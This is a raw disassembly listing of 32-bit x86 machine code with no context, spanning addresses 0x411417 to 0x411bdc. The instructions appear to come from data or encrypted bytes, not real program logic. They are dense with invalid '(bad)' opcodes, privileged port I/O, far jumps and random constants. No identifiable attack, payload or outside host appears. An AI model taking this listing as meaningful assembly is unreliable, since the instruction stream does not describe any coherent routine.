  411417:	sub    DWORD PTR [ecx],ecx
  411419:	mov    ah,0xa6
  41141b:	js     0x41147e
  41141d:	jbe    0x4113f4
  41141f:	cmp    BYTE PTR [eax-0x18],bh
  411422:	jmp    FWORD PTR [ecx-0x4b]
  411425:	cdq    
  411426:	mov    bh,0x1b
  411428:	push   eax
  411429:	xchg   BYTE PTR [esp+eax*4],dh
  41142c:	sti    
  41142d:	xor    dl,BYTE PTR [ebx+0x4e04fd8e]
  411433:	inc    esi
  411434:	xchg   esi,eax
  411435:	jae    0x4113bf
  411437:	add    ebp,ebp
  411439:	std    
  41143a:	xor    esp,DWORD PTR [eax+ecx*8]
  41143d:	and    ebp,DWORD PTR [esi]
  41143f:	xchg   edx,eax
  411440:	push   esp
  411441:	adc    eax,0x3e8f2901
  411446:	loopne 0x4114b4
  411448:	rcl    DWORD PTR [edi],cl
  41144a:	add    eax,0x6dc63b3a
  41144f:	jno    0x4113e4
  411451:	fdivrp st(4),st
  411453:	and    ecx,DWORD PTR [edi-0x1d]
  411456:	and    BYTE PTR [ebp+edx*2+0x22a4a31d],ch
  41145d:	push   ds
  41145e:	in     eax,0x42
  411460:	cmp    BYTE PTR [ebx],0xf0
  411463:	outs   dx,DWORD PTR ds:[esi]
  411464:	ja     0x411473
  411466:	shr    DWORD PTR [eax-0x5f8192b3],0x4
  41146d:	stos   DWORD PTR es:[edi],eax
  41146e:	scas   eax,DWORD PTR es:[edi]
  41146f:	je     0x411497
  411471:	and    eax,0xcaa71a5e
  411476:	pop    ss
  411477:	xor    ebp,0xffffffd2
  41147a:	out    dx,eax
  41147b:	mov    ecx,0x38dd8b5a
  411480:	fcomp  QWORD PTR [eax+eax*4+0x7e]
  411484:	add    al,0xf6
  411486:	dec    eax
  411487:	mov    gs,WORD PTR [eax-0x8]
  41148a:	out    0xda,eax
  41148c:	stos   BYTE PTR es:[edi],al
  41148d:	sub    BYTE PTR [ebx-0x40bebee7],ch
  411493:	lods   al,BYTE PTR ds:[esi]
  411494:	sub    eax,0xb7c523d6
  411499:	leave  
  41149a:	fistp  WORD PTR [edi+edi*8-0x4605c03f]
  4114a1:	and    edx,DWORD PTR [eax]
  4114a3:	cmp    eax,0x7b2fea8
  4114a8:	bound  edi,QWORD PTR [ecx-0x1c]
  4114ab:	outs   dx,DWORD PTR ds:[esi]
  4114ac:	mov    ds:0x6d28b23a,eax
  4114b1:	test   BYTE PTR [eax],dl
  4114b3:	fistp  WORD PTR ss:[esi-0x1f]
  4114b7:	xor    al,0xfc
  4114b9:	nop
  4114ba:	outs   dx,DWORD PTR ds:[esi]
  4114bb:	in     al,0x23
  4114bd:	(bad)  
  4114bf:	mov    ch,0xfa
  4114c1:	or     ebx,esi
  4114c3:	stc    
  4114c4:	out    dx,al
  4114c5:	cdq    
  4114c6:	xor    al,0x2b
  4114c8:	ja     0x411525
  4114ca:	test   al,0xd
  4114cc:	pop    edi
  4114cd:	lea    edx,[esi+0x75]
  4114d0:	test   DWORD PTR [eax+ebp*2+0x45],0x864b51e2
  4114d8:	sbb    al,0xfa
  4114da:	mov    eax,ds:0x9049d9e9
  4114df:	mov    ah,0x9e
  4114e1:	pushf  
  4114e2:	jecxz  0x411498
  4114e4:	sbb    BYTE PTR [edx+0x32],bh
  4114e7:	pop    ds
  4114e8:	jl     0x4114e3
  4114ea:	std    
  4114eb:	sub    ah,dh
  4114ed:	mov    ss,edi
  4114ef:	sub    al,0x75
  4114f1:	rol    DWORD PTR [ebx+eiz*4+0x52],1
  4114f5:	and    DWORD PTR [ebx-0x64],ecx
  4114f8:	aaa    
  4114f9:	(bad)
  4114fc:	ret    0x2bcd
  4114ff:	pushf  
  411500:	add    al,0xf7
  411502:	into   
  411503:	retf   0x9080
  411506:	dec    ecx
  411507:	out    dx,eax
  411508:	xchg   DWORD PTR [edi],ebp
  41150a:	je     0x41149b
  41150c:	ret    
  41150d:	(bad)  [eax+0x19e4374f]
  411513:	cli    
  411514:	inc    ebp
  411515:	(bad)  
  411516:	loopne 0x4114e3
  411518:	out    0xb2,al
  41151a:	add    ecx,eax
  41151c:	pop    es
  41151d:	inc    ecx
  41151e:	sbb    BYTE PTR [ebx],al
  411520:	inc    eax
  411521:	mov    BYTE PTR [edi+eax*4],cl
  411524:	call   FWORD PTR [ebx-0x4ad25e4f]
  41152a:	sub    DWORD PTR [edx],ecx
  41152c:	les    ebp,FWORD PTR [eax-0x51]
  41152f:	jp     0x411566
  411531:	xor    ch,al
  411533:	ret    0x7128
  411536:	sub    BYTE PTR [esi+0x5a],ah
  411539:	xor    bh,BYTE PTR [ebx-0x732a5b1e]
  41153f:	pop    ds
  411540:	(bad)
  411543:	scas   al,BYTE PTR es:[edi]
  411544:	pop    esp
  411545:	fst    DWORD PTR [ebx]
  411547:	and    BYTE PTR [eax+0x61],bl
  41154a:	dec    esi
  41154b:	dec    esp
  41154c:	pushf  
  41154d:	or     al,bh
  41154f:	mov    esi,0xa8537082
  411554:	mov    esp,0x807b561a
  411559:	push   eax
  41155a:	sub    al,0xc6
  41155c:	ds and al,0xb1
  41155f:	jle    0x4114f6
  411561:	xchg   esp,eax
  411562:	fimul  DWORD PTR [ebp-0xf]
  411565:	lds    edx,FWORD PTR [ecx]
  411567:	ror    ah,1
  411569:	dec    ecx
  41156a:	mov    eax,0x5b572893
  41156f:	ficom  WORD PTR [ebp+0x3c4df1f1]
  411575:	jbe    0x4115ee
  411577:	pop    esp
  411578:	xor    eax,0x2b02fec
  41157d:	mov    al,0xdf
  41157f:	cmp    bh,BYTE PTR [edx-0x6e]
  411582:	imul   edx,DWORD PTR [esi+eax*4-0x3a6de4a3],0xf4519459
  41158d:	(bad)  
  41158e:	aam    0x37
  411590:	and    BYTE PTR [edx],cl
  411592:	inc    ebx
  411593:	ins    BYTE PTR es:[edi],dx
  411594:	fisubr DWORD PTR [edi-0xc]
  411597:	cld    
  411598:	push   cs
  411599:	in     al,dx
  41159a:	fisub  DWORD PTR [esp+edi*8+0x6ff6145]
  4115a1:	call   0xb3182b03
  4115a6:	jae    0x4115d8
  4115a8:	ja     0x411595
  4115aa:	cs ds (bad) 
  4115ad:	into   
  4115ae:	fsubr  QWORD PTR [edi]
  4115b0:	call   0xc831:0xd586058e
  4115b7:	jle    0x411542
  4115b9:	fisub  DWORD PTR [edx+edi*1-0x2a]
  4115bd:	icebp  
  4115be:	sti    
  4115bf:	push   0xd15605eb
  4115c4:	and    BYTE PTR ds:0x420478b6,bl
  4115ca:	ss daa 
  4115cc:	sbb    BYTE PTR [ebx+0x28],al
  4115cf:	fcmovb st,st(4)
  4115d1:	pushf  
  4115d2:	xor    esi,DWORD PTR [ecx]
  4115d4:	addr16 in al,dx
  4115d6:	out    0xca,eax
  4115d8:	push   0x6319015e
  4115dd:	mov    ebp,0xeee14e89
  4115e2:	jp     0x41159c
  4115e4:	mov    ebx,0x5d84fa37
  4115e9:	stos   BYTE PTR es:[edi],al
  4115ea:	xor    al,0x2b
  4115ec:	jg     0x411626
  4115ee:	cdq    
  4115ef:	xlat   BYTE PTR ds:[ebx]
  4115f0:	iret   
  4115f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115f2:	cmp    BYTE PTR [ebp+0x4b9ec8a],al
  4115f8:	lods   eax,DWORD PTR gs:[esi]
  4115fa:	pop    es
  4115fb:	stc    
  4115fc:	stos   DWORD PTR es:[di],eax
  4115fe:	cmp    al,0xbb
  411600:	mov    ebp,0x208e067f
  411605:	jecxz  0x4115d7
  411607:	stos   BYTE PTR es:[edi],al
  411608:	push   esp
  411609:	and    eax,0xbbacdf51
  41160e:	mov    eax,ds:0xdb73038d
  411613:	cwde   
  411614:	iret   
  411615:	sub    BYTE PTR [edx-0x67714b6],cl
  41161b:	test   al,0x6f
  41161d:	getsec 
  41161f:	xchg   edx,eax
  411620:	mov    edi,0x373da20f
  411625:	scas   al,BYTE PTR es:[edi]
  411626:	scas   eax,DWORD PTR es:[edi]
  411627:	imul   edx,DWORD PTR [ebx+0x29],0x970ccfbe
  41162e:	lock arpl si,sp
  411631:	mov    edi,0x3648cc10
  411636:	push   ebx
  411637:	jg     0x4115f0
  411639:	in     al,dx
  41163a:	enter  0x1c45,0xb8
  41163e:	adc    al,0xbf
  411640:	xchg   DWORD PTR [edx+0xa1e5199],edx
  411646:	jne    0x41164e
  411648:	ss dec edx
  41164a:	dec    ebx
  41164b:	pop    ss
  41164c:	adc    al,BYTE PTR [ecx+0x45568c59]
  411652:	mov    ds:0xc5f709c7,eax
  411657:	inc    edx
  411658:	jns    0x4115ec
  41165a:	cwde   
  41165b:	inc    edx
  41165c:	mov    edx,0xf8e93894
  411661:	test   cl,cl
  411663:	in     eax,dx
  411664:	sahf   
  411665:	push   cs
  411666:	pop    edx
  411667:	or     DWORD PTR [eax-0x52],ebp
  41166a:	outs   dx,BYTE PTR ds:[esi]
  41166b:	loope  0x411626
  41166d:	add    eax,0x32efd8da
  411672:	in     al,0xa5
  411674:	jge    0x411694
  411676:	leave  
  411677:	push   ss
  411678:	add    al,0xc2
  41167a:	call   0x84993b31
  41167f:	push   ebx
  411680:	pop    esi
  411681:	imul   edi,DWORD PTR [eax+0x38302daf],0xffffffda
  411688:	sahf   
  411689:	ss pop esi
  41168b:	pop    DWORD PTR [ecx-0x501afcc3]
  411691:	mov    esp,0x97c1e937
  411696:	pop    esp
  411697:	jns    0x41164d
  411699:	or     edi,edi
  41169b:	or     al,0x99
  41169d:	imul   edi,DWORD PTR [esi+eiz*4-0x3f],0x667e2b52
  4116a5:	sub    ah,BYTE PTR [ebx]
  4116a7:	push   eax
  4116a8:	std    
  4116a9:	adc    edx,ecx
  4116ab:	mov    ah,0x59
  4116ad:	mov    dh,0x79
  4116af:	or     al,0x84
  4116b1:	inc    ecx
  4116b2:	imul   edx,DWORD PTR [eax-0x6070055c],0x86e24350
  4116bc:	sbb    BYTE PTR [esi-0x13b97412],cl
  4116c2:	cmp    al,0xe7
  4116c4:	adc    DWORD PTR [edi-0x3d5a4630],edi
  4116ca:	sub    BYTE PTR [esi-0x4f],dl
  4116cd:	pop    edx
  4116ce:	(bad)  
  4116d0:	rcr    BYTE PTR [esp+ebp*1-0x27],0x3f
  4116d5:	sub    eax,0x2b416a35
  4116da:	or     al,ah
  4116dc:	jle    0x411758
  4116de:	mov    eax,0x657e4ff0
  4116e3:	push   0xf0cde1cf
  4116e8:	fistp  QWORD PTR [esi+0x36]
  4116eb:	xchg   BYTE PTR [edi+0x3f74099],dh
  4116f1:	(bad)  
  4116f2:	pop    ebx
  4116f3:	jmp    0xdc43:0xb9444b7a
  4116fa:	int    0xba
  4116fc:	cmp    eax,0x186d34e6
  411701:	mov    es,edi
  411703:	sub    ebx,esi
  411705:	rcl    DWORD PTR ds:0x8d4b88e7,0xd6
  41170c:	jecxz  0x411777
  41170e:	repz dec edx
  411710:	add    BYTE PTR [edi+0x1],dh
  411713:	test   BYTE PTR [esi+eiz*4+0x1f2d3a3f],0x9d
  41171b:	ja     0x41169f
  41171d:	pop    edi
  41171e:	dec    ebx
  41171f:	shl    DWORD PTR [ebx-0x7d1bf861],cl
  411725:	push   0xf0684bc
  41172a:	js     0x411708
  41172c:	or     al,0x37
  41172e:	popf   
  41172f:	pop    ebx
  411730:	in     al,dx
  411731:	icebp  
  411732:	in     al,0x9b
  411734:	les    ebx,FWORD PTR ds:0x48bdffc
  41173a:	mov    ?,WORD PTR [edi+0x54b99544]
  411740:	push   es
  411741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411742:	data16 mov al,ds:0x61603e55
  411748:	idiv   DWORD PTR [edi-0x65]
  41174b:	std    
  41174c:	not    DWORD PTR ss:[edi]
  41174f:	lods   al,BYTE PTR ds:[esi]
  411750:	jle    0x4117ab
  411752:	call   0xa273:0xb3d58dc6
  411759:	xchg   ebx,eax
  41175a:	sahf   
  41175b:	punpckhdq mm7,QWORD PTR [ecx-0x77]
  41175f:	test   DWORD PTR [ecx+0x66],eax
  411762:	mov    edx,0x2dc914d9
  411767:	or     edi,DWORD PTR [ebx+0x2d3f52f0]
  41176d:	mov    ebx,0x5bd5a378
  411772:	sub    BYTE PTR [edx],dh
  411774:	jp     0x411786
  411776:	xchg   esp,eax
  411777:	sub    BYTE PTR [ebp-0x70],dl
  41177a:	push   esi
  41177b:	xchg   ebx,eax
  41177c:	sbb    eax,0xde96c282
  411781:	fcmove st,st(2)
  411783:	mov    ds:0xf38a3447,al
  411788:	jae    0x4117fa
  41178a:	rcl    ebx,cl
  41178c:	sub    esp,DWORD PTR [ecx]
  41178e:	push   esi
  41178f:	icebp  
  411790:	in     al,0x40
  411792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411793:	pop    edx
  411794:	cmp    ah,BYTE PTR [edi+0x67]
  411797:	inc    eax
  411798:	fucomip st,st(6)
  41179a:	sbb    cl,ch
  41179c:	mov    edx,0x3fd831a9
  4117a1:	xchg   ebx,eax
  4117a2:	out    0x7d,eax
  4117a4:	inc    esp
  4117a5:	call   0x312:0xc63f5f5e
  4117ac:	lock imul edi,eax,0x6c
  4117b0:	lods   al,BYTE PTR ds:[esi]
  4117b1:	(bad)  
  4117b2:	std    
  4117b3:	xchg   edx,eax
  4117b4:	enter  0x7493,0x16
  4117b8:	(bad)  
  4117b9:	jp     0x41178a
  4117bb:	xchg   ebx,eax
  4117bc:	inc    ebp
  4117bd:	xor    eax,0x45de7a9c
  4117c2:	imul   esi,eax,0x3958ce89
  4117c8:	xchg   ecx,eax
  4117c9:	clc    
  4117ca:	xorps  xmm0,XMMWORD PTR [edi-0x5e990099]
  4117d1:	leave  
  4117d2:	adc    al,0xb8
  4117d4:	je     0x411824
  4117d6:	sub    eax,0x3d45d53d
  4117db:	dec    esi
  4117dc:	cli    
  4117dd:	psubsw mm4,mm7
  4117e0:	test   BYTE PTR [esi+0x160291df],0x5b
  4117e7:	xor    bl,0x28
  4117ea:	sub    DWORD PTR [edx],0x2b091f1d
  4117f0:	mov    cl,0xf7
  4117f2:	xchg   esi,eax
  4117f3:	retf   
  4117f4:	iret   
  4117f5:	mov    al,ds:0xbb33e700
  4117fa:	push   esp
  4117fb:	call   0x6cf1:0x82ef8d20
  411802:	data16 lods al,BYTE PTR ss:[esi]
  411805:	int    0xa9
  411807:	mov    ecx,edx
  411809:	xchg   BYTE PTR [ecx-0x23],dh
  41180c:	or     al,0x32
  41180e:	dec    esi
  41180f:	add    DWORD PTR [esi+0x637a2d76],ebp
  411815:	xchg   ecx,eax
  411816:	sub    DWORD PTR [esi],ebx
  411818:	mov    dl,0x68
  41181a:	(bad)  
  41181b:	call   0xd14221dc
  411820:	into   
  411821:	mov    dh,0x67
  411823:	push   edx
  411824:	dec    esp
  411825:	retf   
  411826:	mov    ah,0xea
  411828:	mov    DWORD PTR [ebx-0x2a437978],ecx
  41182e:	pop    ss
  41182f:	pop    esi
  411830:	push   edi
  411831:	iret   
  411832:	daa    
  411833:	add    al,0x8c
  411835:	and    al,0xed
  411837:	das    
  411838:	adc    BYTE PTR [esi-0x50b61eec],bh
  41183e:	sbb    ebx,DWORD PTR [esi-0x28]
  411841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411842:	add    DWORD PTR [eax-0x6d549d7e],0xffffffb6
  411849:	jbe    0x41183b
  41184b:	xchg   edi,eax
  41184c:	inc    ebp
  41184d:	dec    edx
  41184f:	mov    ebx,0xe0665963
  411854:	sbb    BYTE PTR [ebx+0x20],ah
  411857:	xchg   edx,edx
  411859:	or     esp,DWORD PTR [edi-0x20]
  41185c:	enter  0xd92f,0x90
  411860:	rdtsc  
  411862:	fisttp QWORD PTR [eax]
  411864:	repz pop ss
  411866:	hlt    
  411867:	and    al,0xc9
  411869:	in     eax,dx
  41186a:	xchg   ebp,eax
  41186b:	(bad)  
  41186c:	dec    eax
  41186d:	push   esp
  41186e:	gs dec sp
  411871:	fcomp  QWORD PTR [ebx]
  411873:	iret   
  411874:	leave  
  411875:	sub    al,cl
  411877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411878:	mov    ecx,0xa4883f8a
  41187d:	add    ch,BYTE PTR [edi-0x6e]
  411880:	xor    eax,0x31c03bf4
  411885:	ds adc al,0xe6
  411888:	jmp    0x8f2813ca
  41188d:	jle    0x411892
  41188f:	or     bl,BYTE PTR [eax]
  411891:	sub    DWORD PTR [ebp-0x74],ebx
  411894:	(bad)  
  411895:	outs   dx,BYTE PTR ds:[esi]
  411896:	les    ebp,FWORD PTR [ecx+eax*4+0x4e]
  41189a:	sbb    al,0xdd
  41189c:	inc    ebp
  41189d:	push   es
  41189e:	mov    ds:0xcb1074df,eax
  4118a3:	(bad)  
  4118a6:	jns    0x411925
  4118a8:	icebp  
  4118a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118aa:	xchg   edi,eax
  4118ab:	jmp    0x9b02:0x20d95efd
  4118b2:	in     eax,dx
  4118b3:	jmp    0xf675:0x2ce9b53
  4118ba:	pop    eax
  4118bb:	or     ah,BYTE PTR [eax+0x5c]
  4118be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bf:	fdivr  QWORD PTR [edx-0x19]
  4118c2:	pop    ecx
  4118c3:	xlat   BYTE PTR ds:[ebx]
  4118c4:	rcr    cl,cl
  4118c6:	mov    eax,0x69472e60
  4118cc:	pushf  
  4118cd:	xor    DWORD PTR [esi],edi
  4118cf:	adc    al,0x4e
  4118d1:	or     ebp,DWORD PTR fs:[esi+0x55ef99a7]
  4118d8:	pushf  
  4118d9:	mov    ecx,0x1ce2dcdc
  4118de:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4118e0:	scas   eax,DWORD PTR es:[edi]
  4118e1:	(bad)  [ecx+0x61]
  4118e4:	pusha  
  4118e5:	test   BYTE PTR [ebp+ecx*4+0x7b],ch
  4118e9:	jmp    0xe355206
  4118ee:	cmp    al,0x4
  4118f0:	adc    ebx,esi
  4118f2:	adc    bh,ch
  4118f4:	das    
  4118f5:	mov    eax,DWORD PTR [ebx-0x19]
  4118f8:	or     al,0x66
  4118fa:	xor    al,0xe4
  4118fc:	call   DWORD PTR [esi]
  4118fe:	ja     0x4118da
  411900:	test   DWORD PTR [edx+0x21],ebx
  411903:	dec    ecx
  411904:	pop    edi
  411905:	mov    WORD PTR [edx],ds
  411907:	add    al,0x7a
  411909:	xor    BYTE PTR [edi+0x1e],bh
  41190c:	mov    edi,0xbc9e475b
  411911:	dec    edi
  411912:	outs   dx,BYTE PTR ds:[esi]
  411913:	(bad)  
  411914:	push   esp
  411915:	neg    esp
  411917:	call   DWORD PTR [edi+0x16]
  41191a:	lods   eax,DWORD PTR ds:[esi]
  41191b:	mov    bh,0x34
  41191d:	mov    edi,ss
  41191f:	es maxps xmm6,xmm4
  411923:	mov    dl,0x7
  411925:	dec    ebx
  411926:	push   ecx
  411927:	push   ebx
  411928:	inc    ebx
  411929:	iret   
  41192a:	mov    bl,0x88
  41192c:	sub    al,0x66
  41192e:	mov    esp,0x12b23e66
  411933:	mov    ecx,0xd9e5696
  411938:	add    ecx,edx
  41193a:	adc    esp,eax
  41193c:	aas    
  41193d:	fwait
  41193e:	xchg   ebp,eax
  41193f:	adc    al,0x9d
  411941:	xor    esp,esi
  411943:	cmc    
  411944:	int    0x1f
  411946:	mov    bl,0xbb
  411948:	sbb    bh,BYTE PTR [eax+ecx*2]
  41194b:	add    ecx,DWORD PTR [edx]
  41194d:	xchg   edi,eax
  41194e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41194f:	fdiv   QWORD PTR [eax+edx*1]
  411952:	mov    dl,0x53
  411954:	lds    esi,FWORD PTR [eax+0x4]
  411957:	mov    ebx,0x8e8b4a29
  41195c:	inc    edx
  41195d:	call   0x50b4:0x1c0af5f0
  411964:	pop    esi
  411965:	aas    
  411966:	not    BYTE PTR [esi+0x5f9698bf]
  41196c:	sub    ebp,ecx
  41196e:	arpl   dx,si
  411970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411971:	shl    BYTE PTR [esi-0x47c5c61f],1
  411977:	xor    edi,DWORD PTR [edx-0x7e2d4ed8]
  41197d:	aam    0xff
  41197f:	adc    DWORD PTR [eax+0x6d],0x79
  411983:	ins    DWORD PTR es:[edi],dx
  411984:	push   0x4e7886b2
  411989:	popa   
  41198a:	pop    ss
  41198b:	jbe    0x411916
  41198d:	in     eax,0xe7
  41198f:	ret    0x810b
  411992:	or     eax,0x368c6574
  411997:	shr    BYTE PTR [edi-0x21],1
  41199a:	push   0xffffffc1
  41199c:	mov    ah,BYTE PTR [eax+ecx*4-0xb9a1c85]
  4119a3:	jbe    0x4119a9
  4119a5:	mov    ch,0xc2
  4119a7:	into   
  4119a8:	cdq    
  4119a9:	out    dx,eax
  4119aa:	dec    esp
  4119ab:	jmp    0xb5ea34fd
  4119b0:	mov    cl,0x3d
  4119b2:	out    dx,eax
  4119b3:	cs ss retf 0x6442
  4119b8:	pop    ds
  4119b9:	adc    eax,ebp
  4119bb:	scas   al,BYTE PTR es:[edi]
  4119bc:	sbb    BYTE PTR [eax],dh
  4119be:	xchg   edi,eax
  4119bf:	jb     0x41196d
  4119c1:	cmp    BYTE PTR es:[edi+0x22],al
  4119c5:	sbb    al,0xe5
  4119c7:	and    BYTE PTR [edx],dl
  4119c9:	outs   dx,BYTE PTR ds:[esi]
  4119ca:	push   edx
  4119cb:	test   esi,edi
  4119cd:	in     al,0xb3
  4119cf:	fdivr  DWORD PTR ds:0x58e10557
  4119d5:	(bad)  
  4119d6:	leave  
  4119d7:	jns    0x411a28
  4119d9:	push   0x22
  4119db:	leave  
  4119dc:	cmp    DWORD PTR [ebp-0x8],0x1f
  4119e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119e1:	call   0x9f7dc611
  4119e6:	pop    ss
  4119e7:	ins    BYTE PTR es:[edi],dx
  4119e8:	imul   BYTE PTR [ecx+0x4bbea872]
  4119ee:	mov    al,0x8b
  4119f0:	scas   eax,DWORD PTR es:[edi]
  4119f1:	ds dec eax
  4119f3:	sub    esi,0x3085ea00
  4119f9:	je     0x4119ce
  4119fb:	dec    edx
  4119fc:	rcl    dl,0xa4
  4119ff:	fs jno 0x411a36
  411a02:	mov    bl,0x6e
  411a04:	xlat   BYTE PTR ds:[ebx]
  411a05:	push   0xe70a4ece
  411a0a:	cs xor al,0x21
  411a0d:	sub    dh,BYTE PTR [ebp-0x112bc378]
  411a13:	sub    BYTE PTR gs:[esi+0x32],cl
  411a17:	fisub  DWORD PTR [esi]
  411a19:	dec    edi
  411a1a:	std    
  411a1b:	push   0x75e445b
  411a20:	push   edi
  411a21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a22:	xor    BYTE PTR [ebx+esi*2-0x7582fc7c],bl
  411a29:	nop
  411a2a:	push   edx
  411a2b:	add    al,al
  411a2d:	fs leave 
  411a2f:	enter  0xe161,0x77
  411a33:	or     eax,DWORD PTR [edx+ebp*2]
  411a36:	sub    BYTE PTR [ebx],al
  411a38:	push   eax
  411a39:	(bad)  
  411a3a:	sub    BYTE PTR [ebx-0x8],dh
  411a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a3e:	jecxz  0x411a50
  411a40:	adc    DWORD PTR [edi+edi*1-0x52],0xffffffb9
  411a45:	pop    ebp
  411a46:	bnd jb 0x411a71
  411a49:	nop
  411a4a:	fstp   DWORD PTR [esi]
  411a4c:	xor    DWORD PTR [edx-0x1a],esp
  411a4f:	sbb    al,0xb8
  411a51:	adc    eax,DWORD PTR [esi+ebp*2-0x1a]
  411a55:	aas    
  411a56:	addr16 or eax,0x1e098c30
  411a5c:	ins    BYTE PTR es:[edi],dx
  411a5d:	gs xchg edi,eax
  411a5f:	xchg   ecx,eax
  411a60:	aaa    
  411a61:	mov    gs,edi
  411a63:	mov    bh,0x65
  411a65:	sub    BYTE PTR [eax+0x6f],dl
  411a68:	jmp    0x411a43
  411a6a:	scas   eax,DWORD PTR es:[edi]
  411a6b:	test   DWORD PTR [esi-0x6fc994af],edi
  411a71:	add    al,BYTE PTR [esi]
  411a73:	jnp    0x411aa5
  411a75:	aaa    
  411a76:	ret    0xa4c5
  411a79:	pop    ebp
  411a7a:	mov    edx,esp
  411a7c:	mov    ds:0x93b98f21,al
  411a81:	mov    ds:0xbfa5089,eax
  411a86:	dec    esi
  411a87:	jno    0x411ae1
  411a89:	cmp    DWORD PTR [esi+0x78],eax
  411a8c:	aad    0x9f
  411a8e:	fstp   TBYTE PTR [edx]
  411a90:	jo     0x411ac8
  411a92:	pop    esp
  411a93:	js     0x411ab3
  411a95:	(bad)  
  411a96:	stc    
  411a97:	test   BYTE PTR [ebp-0x2d],ch
  411a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a9b:	scas   al,BYTE PTR es:[edi]
  411a9c:	inc    edx
  411a9d:	int    0x37
  411a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa0:	int3   
  411aa1:	sahf   
  411aa2:	add    ah,BYTE PTR [ecx+0x9fc4bd0]
  411aa8:	cmp    BYTE PTR [ecx],bh
  411aaa:	mov    ebp,0x7a356328
  411aaf:	js     0x411a46
  411ab1:	mov    dl,0xbd
  411ab3:	fmul   DWORD PTR [esi-0x5e]
  411ab6:	sbb    DWORD PTR [eax+0x8],ebp
  411ab9:	push   cs
  411aba:	jns    0x411a6e
  411abc:	sub    al,0x41
  411abe:	dec    edx
  411abf:	mov    ch,0xb
  411ac1:	imul   ebp,DWORD PTR [esi-0x8f0690d],0x834e06c
  411acb:	xchg   ecx,eax
  411acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411acd:	jp     0x411a73
  411acf:	retf   
  411ad0:	adc    edi,edx
  411ad2:	mov    eax,ds:0x5a532138
  411ad7:	mov    edi,0x5247ac50
  411adc:	mov    eax,DWORD PTR [esi]
  411ade:	cwde   
  411adf:	fcomip st,st(7)
  411ae1:	mov    BYTE PTR [eax+0x18],dl
  411ae4:	stos   DWORD PTR es:[edi],eax
  411ae5:	mov    edi,0x9169748c
  411aea:	je     0x411afd
  411aec:	cmp    BYTE PTR [ebx],dl
  411aee:	in     eax,0x6d
  411af0:	jmp    0x2410:0x7536543
  411af7:	fnstsw WORD PTR [eax-0x15]
  411afa:	mov    ds:0xbfd7b47c,eax
  411aff:	mov    ebx,DWORD PTR [edi+0x1d75c18e]
  411b05:	imul   DWORD PTR [eax]
  411b07:	out    dx,eax
  411b08:	cmp    BYTE PTR [edi-0x49c87f75],dh
  411b0e:	sub    cl,al
  411b10:	in     al,0x78
  411b12:	sbb    DWORD PTR cs:[eax-0x59],edi
  411b16:	mov    al,0xc5
  411b18:	imul   ebx,DWORD PTR [edx+0x73],0xffffffb4
  411b1c:	pop    esp
  411b1d:	call   0x9a1c:0xe265042d
  411b24:	pop    es
  411b25:	jb     0x411ac7
  411b27:	inc    ebx
  411b28:	enter  0x1973,0x82
  411b2c:	arpl   WORD PTR [edi],sp
  411b2e:	cmc    
  411b2f:	aad    0xa1
  411b31:	stc    
  411b32:	mov    edi,DWORD PTR [edx]
  411b34:	test   edi,ecx
  411b36:	adc    ch,ch
  411b38:	inc    edx
  411b39:	jmp    0x411b8c
  411b3b:	mov    edi,0xcd13736f
  411b40:	pop    ds
  411b41:	push   ss
  411b42:	jnp    0x411afe
  411b44:	push   esi
  411b45:	mov    al,0xf9
  411b47:	fsubr  st(2),st
  411b49:	push   cs
  411b4a:	cld    
  411b4b:	pop    ds
  411b4c:	mov    ecx,0xb3b731fb
  411b51:	adc    edx,0x61
  411b54:	xchg   DWORD PTR [edx+ebx*1],ebp
  411b57:	idiv   DWORD PTR [ecx-0x58797802]
  411b5d:	pop    es
  411b5e:	test   BYTE PTR [edx+ecx*2+0x3d],dl
  411b62:	arpl   cx,sp
  411b64:	mov    ecx,0x6303064d
  411b69:	hlt    
  411b6a:	rcr    DWORD PTR [ecx],0xc1
  411b6d:	icebp  
  411b6e:	int    0xc7
  411b70:	jnp    0x411b40
  411b72:	shl    bh,1
  411b74:	push   eax
  411b75:	cmp    BYTE PTR [ebx+0x9],bh
  411b78:	hlt    
  411b79:	push   cs
  411b7a:	cli    
  411b7b:	xlat   BYTE PTR ds:[ebx]
  411b7c:	jmp    0x411b6c
  411b7e:	jecxz  0x411b18
  411b80:	ja     0x411bdc
  411b82:	or     cl,bh
  411b84:	xchg   esp,eax
  411b85:	popa   
  411b86:	(bad)  
  411b87:	stc    
  411b88:	mov    esp,0x3c86e06a
  411b8d:	adc    DWORD PTR ds:0x6159eb8b,edi
  411b93:	jmp    0x269436e9
  411b98:	icebp  
  411b99:	sbb    al,0x1d
  411b9b:	jmp    0x3bd819c
  411ba0:	lea    edx,[ebx-0x40]
  411ba3:	pop    ss
  411ba4:	mov    edx,0xfdd23d17
  411ba9:	in     eax,0x41
  411bab:	cmp    ecx,edx
  411bad:	aaa    
  411bae:	lock inc ecx
  411bb0:	add    BYTE PTR [ebx+0x75],ch
  411bb3:	push   esi
  411bb4:	jb     0x411b48
  411bb6:	add    DWORD PTR [esi+0x4316e48a],ebx
  411bbc:	cmp    al,0xac
  411bbe:	xor    ecx,ecx
  411bc0:	clc    
  411bc1:	fdivr  st(5),st
  411bc3:	mov    ch,0xb7
  411bc5:	cmp    BYTE PTR [esi-0x5bb45d09],ah
  411bcb:	(bad)  
  411bcc:	test   eax,0xd878a01c
  411bd1:	popf   
  411bd2:	cmp    al,0x2d
  411bd4:	inc    bx
  411bd6:	cld    
  411bd7:	es (bad) 
  411bd9:	cmp    ebx,ecx
  411bdb:	(bad)  
  411bdc:	mov    ecx,0x76d77885
